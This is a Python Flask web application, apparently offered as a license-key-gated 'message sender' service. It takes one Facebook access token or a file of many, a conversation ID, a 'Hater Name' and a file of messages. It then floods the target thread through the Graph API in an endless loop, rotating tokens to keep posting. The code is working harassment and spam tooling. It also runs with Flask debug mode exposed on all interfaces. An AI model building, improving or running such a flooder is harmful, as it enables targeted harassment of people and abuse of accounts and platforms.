from flask import Flask, request, jsonify, render_template_string
import threading
import requests
import os
import time
from colorama import Fore, init
import random
import string
import hashlib

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
app.debug = True

tasks = {}
verified_users = {}  # Store verified users with their keys

# Admin WhatsApp number (replace with actual admin number)
ADMIN_WHATSAPP_NUMBER = "1234567890"  # Change this to your actual number

# GitHub repository info for key verification
GITHUB_USERNAME = "your_github_username"  # Change this
GITHUB_REPO = "your_repo_name"  # Change this
GITHUB_FILE_PATH = "keys.txt"  # Path to your keys file in the repo

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Function to generate random task id
def generate_random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to verify license key from GitHub
def verify_license_key(key):
    try:
        # Fetch keys from GitHub
        url = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/main/{GITHUB_FILE_PATH}"
        response = requests.get(url)
        if response.status_code == 200:
            valid_keys = response.text.splitlines()
            return key in valid_keys
        return False
    except:
        return False

# Function to send key to admin via WhatsApp (simulated)
def send_key_to_admin(key, user_info):
    # This is a simulation - in a real implementation, you would use WhatsApp API
    # or a service like Twilio to send the actual message
    print(Fore.YELLOW + f"New key activation: {key}")
    print(Fore.YELLOW + f"User info: {user_info}")
    print(Fore.YELLOW + f"Admin would be notified on WhatsApp: {ADMIN_WHATSAPP_NUMBER}")
    
    # For a real implementation, you would use:
    # requests.post(whatsapp_api_url, data={"number": ADMIN_WHATSAPP_NUMBER, "message": f"New key activated: {key}\nUser: {user_info}"})

# Background function to send messages
def send_messages(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens=None):
    tasks[task_id] = {'running': True}

    token_index = 0
    while tasks[task_id]['running']:
        for message1 in messages:
            if not tasks[task_id]['running']:
                break
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                if token_type == 'single':
                    current_token = access_token
                else:
                    current_token = tokens[token_index]
                    token_index = (token_index + 1) % len(tokens)

                parameters = {'access_token': current_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(Fore.GREEN + f"Message sent using token {current_token}: {message}")
                else:
                    print(Fore.RED + f"Failed to send message using token {current_token}: {message}")

                time.sleep(time_interval)
            except Exception as e:
                print(Fore.GREEN + f"Error while sending message using token {current_token}: {message}")
                print(e)
                time.sleep(30)

    print(Fore.YELLOW + f"Task {task_id} stopped.")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Check if license key is provided and valid
        license_key = request.form.get('licenseKey')
        if not license_key or not verify_license_key(license_key):
            return render_template_string('''
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="utf-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Message Sender</title>
              <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
              <style>
                body {
                  background-color: Yellow  ;
                }
                .container {
                  max-width: 400px;
                  background-color: Yellow;
                  border-radius: 10px;
                  padding: 20px;
                  margin: 0 auto;
                  margin-top: 20px;
                  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }
                .header {
                  text-align: center;
                  padding-bottom: 10px;
                }
                .btn-submit {
                  width: 100%;
                  margin-top: 10px;
                }
                .footer {
                  text-align: center;
                  margin-top: 10px;
                  color: blue;
                }
                .alert {
                  margin-top: 20px;
                }
              </style>
            </head>
            <body>
              <header class="header mt-4">
                <h1 class="mb-3">꧁✨RAVIRAJ ATTITUDE࿐✨꧂༺✮•°◤✎﹏ẸϻỖŤĮỖŇÃĹ✎﹏ŜẸŘϋẸŘ✎﹏ŤÃβÃĤĮ✎﹏ỖŇ✎﹏ƑĮŘẸ✎﹏ỖƑƑĮČĮÃĹ✎﹏ŜĮŤẸ..◥°•✮༻</h1>
              </header>

              <div class="container">
                <div class="alert alert-danger" role="alert">
                  <h4 class="alert-heading">Invalid License Key!</h4>
                  <p>Please enter a valid license key to use this service.</p>
                  <hr>
                  <p class="mb-0">Get your key from our GitHub repository.</p>
                </div>
                <form action="/" method="post" enctype="multipart/form-data">
                  <div class="mb-3">
                    <label for="licenseKey">Enter License Key:</label>
                    <input type="text" class="form-control" id="licenseKey" name="licenseKey" required>
                    <small class="form-text text-muted">Get your key from our GitHub repository.</small>
                  </div>
                  <button type="submit" class="btn btn-primary btn-submit">Verify Key</button>
                </form>
              </div>

              <footer class="footer">
                <p>&copy; Developed by ꧁§༺⚔ᴿᴬᵛᴵঔᴬᵀᵀᴵᵀᵁᴰᴱঔᴮᴼᵞ⚔༻§꧂ 2025. All Rights Reserved.</p>
              </footer>
            </body>
            </html>
            ''')
        
        # If key is valid, store it and show the main form
        user_ip = request.remote_addr
        verified_users[user_ip] = license_key
        
        token_type = request.form.get('tokenType')
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if token_type == 'multi':
            token_file = request.files['tokenFile']
            tokens = token_file.read().decode().splitlines()
        else:
            tokens = None

        # Generate random task id
        task_id = generate_random_id()

        # Start the background thread
        thread = threading.Thread(target=send_messages, args=(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens))
        thread.start()

        return jsonify({'task_id': task_id})

    # Check if user already has a verified key
    user_ip = request.remote_addr
    if user_ip in verified_users:
        # Show the main form if user is verified
        return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Message Sender</title>
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
          <style>
            body {
              background-color: Yellow  ;
            }
            .container {
              max-width: 400px;
              background-color: Yellow;
              border-radius: 10px;
              padding: 20px;
              margin: 0 auto;
              margin-top: 20px;
              box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            .header {
              text-align: center;
              padding-bottom: 10px;
            }
            .btn-submit {
              width: 100%;
              margin-top: 10px;
            }
            .footer {
              text-align: center;
              margin-top: 10px;
              color: blue;
            }
          </style>
        </head>
        <body>
          <header class="header mt-4">
            <h1 class="mb-3">꧁✨RAVIRAJ ATTITUDE࿐✨꧂༺✮•°◤✎﹏ẸϻỖŤĮỖŇÃĹ✎﹏ŜẸŘϋẸŘ✎﹏ŤÃβÃĤĮ✎﹏ỖŇ✎﹏ƑĮŘẸ✎﹏ỖƑƑĮČĮÃĹ✎﹏ŜĮŤẸ..◥°•✮༻</h1>
          </header>

          <div class="container">
            <form action="/" method="post" enctype="multipart/form-data">
              <input type="hidden" name="licenseKey" value="{{ license_key }}">
              <div class="mb-3">
                <label for="tokenType">Select Token Type:</label>
                <select class="form-control" id="tokenType" name="tokenType" required>
                  <option value="single">Single Token</option>
                  <option value="multi">Multi Token</option>
                </select>
              </div>
              <div class="mb-3">
                <label for="accessToken">Enter Your Token:</label>
                <input type="text" class="form-control" id="accessToken" name="accessToken">
              </div>
              <div class="mb-3">
                <label for="threadId">Enter Convo/Inbox ID:</label>
                <input type="text" class="form-control" id="threadId" name="threadId" required>
              </div>
              <div class="mb-3">
                <label for="kidx">Enter Hater Name:</label>
                <input type="text" class="form-control" id="kidx" name="kidx" required>
              </div>
              <div class="mb-3">
                <label for="txtFile">Select Your Notepad File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
              </div>
              <div class="mb-3" id="multiTokenFile" style="display: none;">
                <label for="tokenFile">Select Token File (for multi-token):</label>
                <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
              </div>
              <div class="mb-3">
                <label for="time">Speed in Seconds:</label>
                <input type="number" class="form-control" id="time" name="time" required>
              </div>
              <button type="submit" class="btn btn-primary btn-submit">Start Task</button>
            </form>
          </div>

          <div class="container mt-4">
            <h3>Stop Task</h3>
            <form action="/stop_task" method="post">
              <div class="mb-3">
                <label for="taskId">Enter Task ID:</label>
                <input type="text" class="form-control" id="taskId" name="taskId" required>
              </div>
              <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
            </form>
          </div>

          <footer class="footer">
            <p>&copy; Developed by ꧁§༺⚔ᴿᴬᵛᴵঔᴬᵀᵀᴵᵀᵁᴰᴱঔᴮᴼᵞ⚔༻§꧂ 2025. All Rights Reserved.</p>
          </footer>

          <script>
            document.getElementById('tokenType').addEventListener('change', function() {
              var tokenType = this.value;
              document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
              document.getElementById('accessToken').style.display = tokenType === 'multi' ? 'none' : 'block';
            });
          </script>
        </body>
        </html>
        ''', license_key=verified_users[user_ip])
    else:
        # Show license key verification form
        return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Message Sender</title>
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
          <style>
            body {
              background-color: Yellow  ;
            }
            .container {
              max-width: 400px;
              background-color: Yellow;
              border-radius: 10px;
              padding: 20px;
              margin: 0 auto;
              margin-top: 20px;
              box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            .header {
              text-align: center;
              padding-bottom: 10px;
            }
            .btn-submit {
              width: 100%;
              margin-top: 10px;
            }
            .footer {
              text-align: center;
              margin-top: 10px;
              color: blue;
            }
          </style>
        </head>
        <body>
          <header class="header mt-4">
            <h1 class="mb-3">꧁✨RAVIRAJ ATTITUDE࿐✨꧂༺✮•°◤✎﹏ẸϻỖŤĮỖŇÃĹ✎﹏ŜẸŘϋẸŘ✎﹏ŤÃβÃĤĮ✎﹏ỖŇ✎﹏ƑĮŘẸ✎﹏ỖƑƑĮČĮÃĹ✎﹏ŜĮŤẸ..◥°•✮༻</h1>
          </header>

          <div class="container">
            <form action="/" method="post" enctype="multipart/form-data">
              <div class="mb-3">
                <label for="licenseKey">Enter License Key:</label>
                <input type="text" class="form-control" id="licenseKey" name="licenseKey" required>
                <small class="form-text text-muted">Get your key from our GitHub repository.</small>
              </div>
              <button type="submit" class="btn btn-primary btn-submit">Verify Key</button>
            </form>
          </div>

          <footer class="footer">
            <p>&copy; Developed by ꧁§༺⚔ᴿᴬᵛᴵঔᴬᵀᵀᴵᵀᵁᴰᴱঔᴮᴼᵞ⚔༻§꧂ 2025. All Rights Reserved.</p>
          </footer>
        </body>
        </html>
        ''')

@app.route('/stop_task', methods=['POST'])
def stop_task():
    """Stop a running task based on the task ID."""
    task_id = request.form.get('taskId')
    if task_id in tasks:
        tasks[task_id]['running'] = False
        return jsonify({'status': 'stopped', 'task_id': task_id})
    return jsonify({'status': 'not found', 'task_id': task_id}), 404

@app.route('/get_key', methods=['GET'])
def get_key_info():
    """Provide information on how to get a license key"""
    return jsonify({
        "message": "To get a license key, visit our GitHub repository",
        "github_url": f"https://github.com/{GITHUB_USERNAME}/{GITHUB_REPO}"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
